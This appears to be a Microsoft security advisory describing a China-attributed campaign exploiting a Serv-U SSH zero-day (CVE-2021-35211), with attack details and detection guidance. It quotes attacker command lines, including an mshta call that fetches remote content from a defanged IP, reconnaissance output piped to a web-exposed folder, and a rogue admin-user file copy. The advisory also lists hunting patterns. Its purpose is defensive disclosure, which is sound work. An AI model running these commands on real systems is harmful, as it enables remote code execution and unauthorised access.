Serv-U software with 0-day exploit

Microsoft has detected a 0-day remote code execution exploit being used to attack
SolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat
Intelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a
group operating out of China, based on observed victimology, tactics, and procedures.
The vulnerability being exploited is CVE-2021-35211, which was recently patched by
SolarWinds. The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s
implementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is exposed to the
internet, successful exploitation would give attackers ability to remotely run arbitrary code
with privileges, allowing them to perform actions like install and run malicious payloads, or
view and change data. We strongly urge all customers to update their instances of Serv-U to
the latest available version.

Microsoft 365 Defender has been protecting customers against malicious activity resulting
from successful exploitation, even before the security patch was available. Microsoft
Defender Antivirus blocks malicious files, behavior, and payloads. Our endpoint protection
solution detects and raises alerts for the attacker’s follow-on malicious actions. Microsoft
Threat Experts customers who were affected were notified of attacker activity and were aided
in responding to the attack.
Microsoft would like to thank SolarWinds for their cooperation and quick response to the
vulnerability we reported.

Who is DEV-0322?
MSTIC tracks and investigates a range of malicious cyber activities and operations. During
the tracking and investigation phases prior to when MSTIC reaches high confidence about
the origin or identity of the actor behind an operation, we refer to the unidentified threat actor
as a “development group” or “DEV group” and assigns each DEV group a unique number
(DEV-####) for tracking purposes.
MSTIC has observed DEV-0322 targeting entities in the U.S. Defense Industrial Base Sector
and software companies. This activity group is based in China and has been observed using
commercial VPN solutions and compromised consumer routers in their attacker
infrastructure.

Attack details
MSTIC discovered the 0-day attack behavior in Microsoft 365 Defender telemetry during a
routine investigation. An anomalous malicious process was found to be spawning from the
Serv-U process, suggesting that it had been compromised. Some examples of the malicious
processes spawned from Serv-U.exe include:
C:\Windows\System32\mshta.exe http://144[.]34[.]179[.]162/a (defanged)
cmd.exe /c whoami > “./Client/Common/redacted.txt”
cmd.exe /c dir > “.\Client\Common\redacted.txt”
cmd.exe /c “”C:\Windows\Temp\Serv-U.bat””
powershell.exe C:\Windows\Temp\Serv-U.bat
cmd.exe /c type \\redacted\redacted.Archive > “C:\ProgramData\RhinoSoft\ServU\Users\Global Users\redacted.Archive”
We observed DEV-0322 piping the output of their cmd.exe commands to files in the Serv-U
\Client\Common\ folder, which is accessible from the internet by default, so that the attackers
could retrieve the results of the commands. The actor was also found adding a new global
user to Serv-U, effectively adding themselves as a Serv-U administrator, by manually
creating a crafted .Archive file in the Global Users directory. Serv-U user information is stored
in these .Archive files.
2/5

Due to the way DEV-0322 had written their code, when the exploit successfully compromises
the Serv-U process, an exception is generated and logged to a Serv-U log file,
DebugSocketLog.txt. The process could also crash after a malicious command was run.
By reviewing telemetry, we identified features of the exploit, but not a root-cause vulnerability.
MSTIC worked with the Microsoft Offensive Security Research team, who performed
vulnerability research on the Serv-U binary and identified the vulnerability through black box
analysis. Once a root cause was found, we reported the vulnerability to SolarWinds, who
responded quickly to understand the issue and build a patch.
To protect customers before a patch was available, the Microsoft 365 Defender team quickly
released detections that catch known malicious behaviours, ensuring customers are
protected from and alerted to malicious activity related to the 0-day. Affected customers
enrolled to Microsoft Threat Experts, our managed threat hunting service, received a
targeted attack notification, which contained details of the compromise. The Microsoft Threat
Experts and MSTIC teams worked closely with these customers to respond to the attack and
ensure their environments were secure.

Detection guidance
Customers should review the Serv-U DebugSocketLog.txt log file for exception messages
like the line below. A C0000005; CSUSSHSocket::ProcessReceive exception can indicate
that an exploit was attempted, but it can also appear for unrelated reasons. Either way, if the
exception is found, customers should carefully review their logs for behaviors and indicators
of compromise discussed here.
EXCEPTION: C0000005; CSUSSHSocket::ProcessReceive(); Type: 30; puchPayLoad
= 0x03e909f6; nPacketLength = 76; nBytesReceived = 80; nBytesUncompressed =
156; uchPaddingLength = 5

Additional signs of potential compromise include:
Recent creation of .txt files in the Client\Common\ directory for the Serv-U installation.
These files may contain output from Windows commands like whoami and dir.

3/5

Serv-U.exe spawning child processes that are not part of normal operations. These
could change depending on the customer environment, but we suggest searching for:
mshta.exe
powershell.exe
cmd.exe (or conhost.exe then spawning cmd.exe) with any of the following in the
command line:
whoami
dir
./Client/Common
.\Client\Common
type [a file path] > “C:\ProgramData\RhinoSoft\Serv-U\Users\Global Users\
[file name].Archive”
Any process with any of the following in the command line:
C:\Windows\Temp\
The addition of any unrecognized global users to Serv-U. This can be checked in the
Users tab of the Serv-U Management Console, as shown below. It can also be checked
by looking for recently created files in C:\ProgramData\RhinoSoft\Serv-U\Users\Global
Users, which appears to store the Global users information.
